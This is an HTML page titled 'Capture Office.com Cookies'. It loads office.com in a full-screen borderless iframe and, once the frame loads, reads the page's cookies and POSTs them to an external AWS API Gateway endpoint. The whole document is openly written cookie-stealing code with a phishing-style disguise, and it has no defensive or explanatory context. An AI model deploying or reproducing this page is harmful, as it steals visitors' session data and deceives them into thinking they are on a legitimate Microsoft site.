<!DOCTYPE html>
<html>
<head>
    <title>Capture Office.com Cookies</title>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var captureCookies = function() {
                var cookies = document.cookie;
                if (cookies) {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://3vw0f1k33f.execute-api.us-east-2.amazonaws.com/prod', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({ cookies: cookies }));
                }
            };

            var iframe = document.createElement('iframe');
            iframe.src = 'https://www.office.com';
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            iframe.style.border = 'none';
            document.body.appendChild(iframe);

            iframe.onload = function() {
                captureCookies();
            };
        });
    </script>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
</body>
</html>
